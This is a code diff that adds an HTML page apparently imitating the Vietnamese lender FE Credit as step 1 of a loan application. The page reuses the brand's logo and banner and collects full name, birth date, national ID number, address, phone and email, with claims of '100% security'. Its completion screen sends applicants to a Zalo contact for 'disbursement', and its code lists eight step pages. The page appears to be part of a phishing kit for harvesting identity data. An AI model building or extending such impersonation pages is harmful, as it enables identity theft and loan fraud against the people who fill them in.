@@ -1,0 +1,548 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>FE Credit - Bước 1: Thông tin cá nhân</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #00994F;
+            --primary-hover: #007a3f;
+            --text-color: #292929;
+            --bg-light: #f8f9fa;
+        }
+        body { font-family: 'Be Vietnam Pro', sans-serif; background-color: var(--bg-light); color: var(--text-color); }
+        
+        /* Header & Nav */
+        #site-header { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); padding: 10px 0; }
+        .nav__link { text-decoration: none; color: var(--text-color); font-weight: 600; padding: 0 15px; }
+        .nav__link:hover { color: var(--primary-color); }
+
+        /* Banner */
+        .banner-hero { position: relative; border-radius: 0 0 20px 20px; overflow: hidden; margin-bottom: 30px; }
+        
+        /* Progress Steps */
+        .steps { display: flex; justify-content: space-between; margin: 30px auto; max-width: 800px; position: relative; }
+        .step { flex: 1; text-align: center; font-size: 14px; font-weight: 600; color: #999; position: relative; z-index: 1; }
+        .step.active { color: var(--primary-color); }
+        .step.active::after { content: ''; position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%); width: 100%; height: 3px; background: var(--primary-color); }
+        
+        /* Form Styling */
+        .step1-container { max-width: 800px; margin: 0 auto 50px; background: #fff; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+        .form-section-header { display: flex; align-items: center; margin-bottom: 24px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+        .form-section-icon { width: 40px; height: 40px; background: #e6f5ed; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--primary-color); margin-right: 15px; font-size: 18px; }
+        .form-section-title { font-size: 18px; font-weight: 700; margin: 0; color: var(--primary-color); }
+        .form-section-subtitle { font-size: 13px; color: #666; margin: 0; }
+        
+        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media (max-width: 768px) { .form-grid { grid-template-columns: 1fr; } }
+        
+        .form-field { position: relative; margin-bottom: 5px; }
+        .form-label { font-weight: 500; font-size: 14px; margin-bottom: 8px; display: block; }
+        .form-control { border-radius: 8px; padding: 12px 12px 12px 40px; border: 1px solid #ddd; font-size: 15px; transition: all 0.3s; }
+        .form-control:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(0, 153, 79, 0.1); }
+        .form-field-icon { position: absolute; left: 12px; top: 42px; color: #999; z-index: 2; }
+        
+        /* Validation States */
+        .form-control.is-invalid { border-color: #dc3545; background-image: none; }
+        .invalid-feedback { font-size: 12px; margin-top: 5px; }
+        
+        /* Buttons */
+        .btn-next { width: 100%; margin-top: 30px; background: linear-gradient(135deg, #00994F 0%, #00b359 100%); border: none; padding: 16px; font-weight: 700; font-size: 16px; letter-spacing: 0.5px; border-radius: 12px; }
+        .btn-next:disabled { background: #ccc; cursor: not-allowed; opacity: 0.7; }
+        .btn-next:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 153, 79, 0.3); }
+
+        /* Auto Save Indicator */
+        .auto-save-indicator { position: fixed; bottom: 20px; right: 20px; background: #fff; padding: 10px 20px; border-radius: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); font-size: 13px; color: #666; display: flex; align-items: center; gap: 8px; transform: translateY(100px); transition: transform 0.3s ease; z-index: 1000; }
+        .auto-save-indicator.show { transform: translateY(0); }
+        .auto-save-indicator.success { color: var(--primary-color); }
+    </style>
+</head>
+<body>
+    <div id="site">
+        <header id="site-header">
+            <div class="container d-flex justify-content-between align-items-center">
+                <div id="logo" style="width: 150px;">
+                    <a href="index.html">
+                        <img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" 
+                             alt="FE CREDIT - Ngân hàng tài chính tiêu dùng hàng đầu Việt Nam" 
+                             style="width:100%"
+                             width="150"
+                             height="40">
+                    </a>
+                </div>
+                <nav class="d-none d-md-block">
+                    <a class="nav__link" href="../index.html">Trang Chủ</a>
+                    <a class="nav__link" href="#site-footer">Liên Hệ</a>
+                </nav>
+            </div>
+        </header>
+
+        <main id="site-content">
+            <section class="banner-hero">
+                <img src="https://www-cdn.fecredit.com.vn/media/orjlo45e/banner-destop.jpg" 
+                     alt="Banner quảng cáo vay tiêu dùng FE CREDIT - Lãi suất ưu đãi, thủ tục nhanh chóng" 
+                     style="width: 100%; height: auto; display: block;"
+                     loading="lazy">
+            </section>
+
+            <div class="container">
+                <div id="errorSummaryAlert" class="alert alert-danger" style="display: none;">
+                    <i class="fas fa-exclamation-triangle me-2"></i>
+                    <span id="errorSummaryText">Vui lòng kiểm tra thông tin</span>
+                </div>
+            </div>
+
+            <div class="container">
+                <div class="steps">
+                    <div class="step active">1. THÔNG TIN CÁ NHÂN</div>
+                    <div class="step">2. KHOẢN VAY</div>
+                    <div class="step">3. XÁC THỰC</div>
+                </div>
+            </div>
+
+            <div class="container">
+                <div class="step1-container">
+                    <form id="registrationForm" onsubmit="return false;" novalidate>
+                        
+                        <div class="form-section">
+                            <div class="form-section-header">
+                                <div class="form-section-icon"><i class="fas fa-user"></i></div>
+                                <div>
+                                    <h3 class="form-section-title">THÔNG TIN CÁ NHÂN</h3>
+                                    <p class="form-section-subtitle">Nhập chính xác theo CCCD/CMND</p>
+                                </div>
+                            </div>
+                            
+                            <div class="form-grid">
+                                <div class="form-field">
+                                    <label for="fullName" class="form-label">Họ và tên *</label>
+                                    <i class="fas fa-user form-field-icon"></i>
+                                    <input type="text" class="form-control" id="fullName" name="fullName" required placeholder="NGUYEN VAN A" style="text-transform: uppercase;">
+                                    <div class="invalid-feedback" id="fullNameError">Họ tên không được để trống</div>
+                                </div>
+
+                                <div class="form-field">
+                                    <label for="dob" class="form-label">Ngày sinh *</label>
+                                    <i class="fas fa-calendar-alt form-field-icon"></i>
+                                    <input type="text" class="form-control" id="dob" name="dob" required placeholder="dd/mm/yyyy" maxlength="10">
+                                    <div class="invalid-feedback" id="dobError">Ngày sinh không hợp lệ</div>
+                                </div>
+                                
+                                <div class="form-field">
+                                    <label for="gender" class="form-label">Giới tính *</label>
+                                    <i class="fas fa-venus-mars form-field-icon"></i>
+                                    <select class="form-control" id="gender" name="gender" required>
+                                        <option value="">Chọn giới tính</option>
+                                        <option value="Nam">Nam</option>
+                                        <option value="Nữ">Nữ</option>
+                                    </select>
+                                    <div class="invalid-feedback" id="genderError">Vui lòng chọn giới tính</div>
+                                </div>
+
+                                <div class="form-field">
+                                    <label for="cccd" class="form-label">Số CCCD/CMND *</label>
+                                    <i class="fas fa-id-card form-field-icon"></i>
+                                    <input type="text" class="form-control" id="cccd" name="cccd" required maxlength="12" placeholder="Nhập 12 số CCCD">
+                                    <div class="invalid-feedback" id="cccdError">CCCD phải đủ 12 số</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-field mt-3">
+                                <label for="contactAddress" class="form-label">Địa chỉ hiện tại *</label>
+                                <i class="fas fa-map-marker-alt form-field-icon"></i>
+                                <input type="text" class="form-control" id="contactAddress" name="contactAddress" required placeholder="Số nhà, Đường, Phường/Xã, Quận/Huyện, Tỉnh/Thành">
+                                <div class="invalid-feedback" id="contactAddressError">Vui lòng nhập địa chỉ đầy đủ</div>
+                            </div>
+                        </div>
+
+                        <div class="form-section mt-4">
+                            <div class="form-section-header">
+                                <div class="form-section-icon"><i class="fas fa-phone"></i></div>
+                                <div>
+                                    <h3 class="form-section-title">THÔNG TIN LIÊN HỆ</h3>
+                                    <p class="form-section-subtitle">Để nhận thông báo kết quả vay</p>
+                                </div>
+                            </div>
+                            
+                            <div class="form-grid">
+                                <div class="form-field">
+                                    <label for="issuePlace" class="form-label">Nơi cấp CCCD *</label>
+                                    <i class="fas fa-building form-field-icon"></i>
+                                    <select class="form-control" id="issuePlace" name="issuePlace" required>
+                                        <option value="">Chọn nơi cấp</option>
+                                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
+                                        <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
+                                    </select>
+                                    <div class="invalid-feedback" id="issuePlaceError">Vui lòng chọn nơi cấp</div>
+                                </div>
+
+                                <div class="form-field">
+                                    <label for="phone" class="form-label">Số điện thoại *</label>
+                                    <i class="fas fa-mobile-alt form-field-icon"></i>
+                                    <input type="tel" class="form-control" id="phone" name="phone" required maxlength="10" placeholder="09xxxxxxxx">
+                                    <div class="invalid-feedback" id="phoneError">SĐT không hợp lệ</div>
+                                </div>
+                                
+                                <div class="form-field" style="grid-column: 1 / -1;">
+                                    <label for="email" class="form-label">Email *</label>
+                                    <i class="fas fa-envelope form-field-icon"></i>
+                                    <input type="email" class="form-control" id="email" name="email" required placeholder="email@example.com">
+                                    <div class="invalid-feedback" id="emailError">Email không hợp lệ</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step-navigation">
+                             <div class="d-flex align-items-center mb-3 text-muted" style="font-size: 13px;">
+                                <i class="fas fa-lock me-2" style="color: var(--primary-color);"></i>
+                                Thông tin của bạn được bảo mật tuyệt đối 100%
+                            </div>
+                            <button type="button" onclick="goToStep2()" class="btn btn-primary btn-next" id="submitButton">
+                                TIẾP TỤC <i class="fas fa-arrow-right ms-2"></i>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </main>
+
+        <footer id="site-footer" class="bg-light py-4 text-center">
+            <div class="container">
+                <p class="text-muted small">© 2024 FE Credit. All rights reserved.</p>
+            </div>
+        </footer>
+    </div>
+
+    <div id="autoSaveIndicator" class="auto-save-indicator">
+        <i class="fas fa-save"></i> Đang lưu...
+    </div>
+
+    <div id="loadingModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
+        <div class="bg-white p-4 rounded-3 text-center" style="width: 300px;">
+            <div class="spinner-border text-success mb-3" role="status"></div>
+            <h5 class="mb-2">Đang xử lý...</h5>
+            <p class="text-muted small mb-0">Đang chuyển sang bước 2</p>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+
+    <script>
+        // =====================================================================
+        // PHẦN 2: LOGIC ĐIỀU HƯỚNG VÀ CHẶN TRUY CẬP (CHỈ ÁP DỤNG CHO STEP1)
+        // =====================================================================
+        (function checkNavigationLogic() {
+            const APPLICATION_STATUS_COMPLETED = 'completed';
+            const VALID_STEPS = ['step1.html', 'step2.html', 'step3.html', 'step4.html', 'step5.html', 'step6.html', 'step7.html', 'step8.html'];
+            
+            const applicationStatus = localStorage.getItem('applicationStatus');
+            const currentStep = localStorage.getItem('currentStep');
+            
+            // Trường hợp 1: Đã hoàn tất hồ sơ
+            if (applicationStatus === APPLICATION_STATUS_COMPLETED) {
+                // Xóa nội dung form và hiển thị thông báo
+                const formContainer = document.querySelector('.step1-container');
+                if (formContainer) {
+                    formContainer.innerHTML = `
+                        <div style="text-align: center; padding: 40px 20px;">
+                            <div style="font-size: 60px; color: #00994F; margin-bottom: 20px;">
+                                <i class="fas fa-check-circle"></i>
+                            </div>
+                            <h3 style="color: #00994F; margin-bottom: 20px;">Đả có hồ sơ đăng ký tại hệ thống</h3>
+                            <p style="font-size: 16px; color: #666; line-height: 1.8; max-width: 500px; margin: 0 auto;">
+                               Bạn đả có hồ sơ tại hệ thống hoặc đang trong quá trình xét duyệt. Vui lòng liên hệ hỗ trợ hoặc nhân viên làm hồ sơ để được hỗ trợ và giải ngân!
+                            </p>
+                            <div style="margin-top: 30px;">
+                                <a href="https://zalo.me/3932037504673339016" 
+                                   target="_blank"
+                                   rel="noopener noreferrer"
+                                   class="btn btn-primary"
+                                   style="background: linear-gradient(135deg, #00994F 0%, #00b359 100%); 
+                                          border: none; 
+                                          padding: 15px 40px; 
+                                          font-weight: 700; 
+                                          border-radius: 10px; 
+                                          text-decoration: none; 
+                                          display: inline-block;">
+                                    <i class="fas fa-phone me-2"></i>Liên hệ ngay
+                                </a>
+                            </div>
+                        </div>
+                    `;
+                }
+                return; // Dừng lại, không thực hiện logic tiếp theo
+            }
+            
+            // Trường hợp 2: Đang làm dở - chuyển hướng về bước đã lưu
+            if (currentStep && currentStep !== 'step1.html') {
+                // Validate that currentStep is a valid step file (security check)
+                if (VALID_STEPS.includes(currentStep)) {
+                    // Chuyển hướng về bước đã lưu
+                    window.location.href = currentStep;
+                    return;
+                }
+            }
+        })();
+
+        // =====================================================================
+        // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
+        // =====================================================================
+        // Lưu vị trí hiện tại sau khi đã kiểm tra điều hướng
+        localStorage.setItem('currentStep', 'step1.html');
+
+        // --- 1. UTILITIES (From step1cu.html) ---
+        const SECRET_KEY = 'fecredit-secret-key-v1'; // Unified encryption key across all steps
+
+        function showAutoSave() {
+            const indicator = $('#autoSaveIndicator');
+            indicator.addClass('show');
+            setTimeout(() => {
+                indicator.addClass('success').html('<i class="fas fa-check"></i> Đã lưu');
+                setTimeout(() => indicator.removeClass('show success').html('<i class="fas fa-save"></i> Đang lưu...'), 2000);
+            }, 500);
+        }
+
+        // Mã hóa và lưu vào LocalStorage (From step1cu.html)
+        function saveUserData(data) {
+            try {
+                // Lấy data cũ nếu có để không bị mất thông tin các bước khác
+                let existingData = {};
+                const encryptedOld = localStorage.getItem('userData');
+                if (encryptedOld) {
+                    try {
+                        existingData = JSON.parse(CryptoJS.AES.decrypt(encryptedOld, SECRET_KEY).toString(CryptoJS.enc.Utf8));
+                    } catch(e) {}
+                }
+
+                // Merge data mới vào data cũ
+                const newData = { ...existingData, ...data, currentStep: 1, timestamp: new Date().toISOString() };
+                
+                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(newData), SECRET_KEY).toString();
+                localStorage.setItem('userData', encrypted);
+                showAutoSave();
+                return true;
+            } catch (error) {
+                console.error("Save error", error);
+                return false;
+            }
+        }
+
+        function loadUserData() {
+            const encrypted = localStorage.getItem('userData');
+            if (!encrypted) return null;
+            try {
+                return JSON.parse(CryptoJS.AES.decrypt(encrypted, SECRET_KEY).toString(CryptoJS.enc.Utf8));
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // --- 2. VALIDATION LOGIC (From step1cu.html) ---
+        function validateStep1() {
+            let isValid = true;
+            let firstErrorElement = null;
+            const today = new Date();
+            today.setHours(0, 0, 0, 0);
+            
+            // Validate Họ tên
+            const fullName = $('#fullName').val().trim();
+            if (fullName.length < 3) {
+                $('#fullName').addClass('is-invalid');
+                $('#fullNameError').text('Họ và tên phải dài hơn 2 ký tự.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#fullName')[0];
+            } else {
+                $('#fullName').removeClass('is-invalid');
+            }
+
+            // Validate Ngày sinh
+            const dob = $('#dob').val();
+            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dob)) {
+                $('#dob').addClass('is-invalid');
+                $('#dobError').text('Ngày sinh không hợp lệ (dd/mm/yyyy).');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+            } else {
+                const [day, month, year] = dob.split('/').map(Number);
+                if (year < 1900 || year > today.getFullYear()) {
+                    $('#dob').addClass('is-invalid');
+                    $('#dobError').text('Năm sinh không hợp lệ.');
+                    isValid = false;
+                    if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+                } else {
+                    const birthDate = new Date(year, month - 1, day);
+                    if (birthDate > today) {
+                        $('#dob').addClass('is-invalid');
+                        $('#dobError').text('Ngày sinh không được ở tương lai.');
+                        isValid = false;
+                        if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+                    } else {
+                        // Check age (18-70)
+                        const ageDifMs = today - birthDate.getTime();
+                        const ageDate = new Date(ageDifMs);
+                        const age = Math.abs(ageDate.getUTCFullYear() - 1970);
+                        
+                        if (age < 18) {
+                            $('#dob').addClass('is-invalid');
+                            $('#dobError').text('Bạn phải đủ 18 tuổi để vay.');
+                            isValid = false;
+                            if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+                        } else if (age > 70) {
+                            $('#dob').addClass('is-invalid');
+                            $('#dobError').text('Độ tuổi vượt quá giới hạn (70 tuổi).');
+                            isValid = false;
+                            if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+                        } else {
+                            $('#dob').removeClass('is-invalid');
+                        }
+                    }
+                }
+            }
+
+            // Validate Giới tính
+            if (!$('#gender').val()) {
+                $('#gender').addClass('is-invalid');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#gender')[0];
+            } else {
+                $('#gender').removeClass('is-invalid');
+            }
+
+            // Validate CCCD (12 số)
+            const cccd = $('#cccd').val().replace(/\s/g, '');
+            if (!/^\d{12}$/.test(cccd)) {
+                $('#cccd').addClass('is-invalid');
+                $('#cccdError').text('CCCD phải là 12 số.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#cccd')[0];
+            } else {
+                $('#cccd').removeClass('is-invalid');
+            }
+
+            // Validate Địa chỉ
+            if ($('#contactAddress').val().trim().length < 6) {
+                $('#contactAddress').addClass('is-invalid');
+                $('#contactAddressError').text('Địa chỉ thường trú phải dài hơn 5 ký tự.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#contactAddress')[0];
+            } else {
+                $('#contactAddress').removeClass('is-invalid');
+            }
+
+            // Validate Nơi cấp
+            if (!$('#issuePlace').val()) {
+                $('#issuePlace').addClass('is-invalid');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#issuePlace')[0];
+            } else {
+                $('#issuePlace').removeClass('is-invalid');
+            }
+
+            // Validate SĐT (10 số, bắt đầu bằng 0)
+            const phone = $('#phone').val().replace(/\s/g, '');
+            if (!/^0[1-9][0-9]{8}$/.test(phone)) {
+                $('#phone').addClass('is-invalid');
+                $('#phoneError').text('Số điện thoại phải là 10 số, bắt đầu bằng 0.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#phone')[0];
+            } else {
+                $('#phone').removeClass('is-invalid');
+            }
+
+            // Validate Email
+            const email = $('#email').val().trim();
+            if (!/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email)) {
+                $('#email').addClass('is-invalid');
+                $('#emailError').text('Email không hợp lệ.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#email')[0];
+            } else {
+                $('#email').removeClass('is-invalid');
+            }
+
+            // Handle Error Alert
+            if(!isValid) {
+                $('#errorSummaryAlert').slideDown();
+                if (firstErrorElement) {
+                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstErrorElement.focus();
+                }
+            } else {
+                $('#errorSummaryAlert').slideUp();
+            }
+
+            return isValid;
+        }
+
+        // --- 3. MAIN FUNCTIONS ---
+        $(document).ready(function() {
+            // Apply Masks
+            $('#dob').mask('00/00/0000');
+            $('#cccd').mask('000000000000');
+            $('#phone').mask('0000000000');
+
+            // Load Data cũ nếu có
+            const savedData = loadUserData();
+            if (savedData) {
+                $('#fullName').val(savedData.fullName || '');
+                $('#dob').val(savedData.dob || '');
+                $('#gender').val(savedData.gender || '');
+                $('#cccd').val(savedData.cccd || '');
+                $('#contactAddress').val(savedData.contactAddress || '');
+                $('#issuePlace').val(savedData.issuePlace || '');
+                $('#phone').val(savedData.phone || '');
+                $('#email').val(savedData.email || '');
+            }
+
+            // Auto uppercase Name
+            $('#fullName').on('input', function() {
+                this.value = this.value.toUpperCase();
+            });
+
+            // Live Validation remove error on input
+            $('input, select').on('input change', function() {
+                $(this).removeClass('is-invalid');
+                $('#errorSummaryAlert').slideUp();
+            });
+        });
+
+        // Hàm chuyển bước (Được gọi từ nút Tiếp tục) - From step1cu.html logic
+        function goToStep2() {
+            if (validateStep1()) {
+                // Thu thập dữ liệu - MUST match step1cu.html fields exactly
+                const formData = {
+                    fullName: $('#fullName').val().trim(),
+                    dob: $('#dob').val(),
+                    gender: $('#gender').val(),
+                    cccd: $('#cccd').val().trim(),
+                    contactAddress: $('#contactAddress').val().trim(),
+                    issuePlace: $('#issuePlace').val(),
+                    phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^(\+?84)/, '0'),
+                    email: $('#email').val().trim()
+                };
+
+                // Lưu
+                saveUserData(formData);
+
+                // Hiệu ứng Loading
+                $('#loadingModal').css('display', 'flex').hide().fadeIn();
+                
+                // Chuyển trang sau 1.5s
+                setTimeout(() => {
+                    window.location.href = 'step2.html';
+                }, 1500);
+            }
+        }
+    </script>
+</body>
+</html>
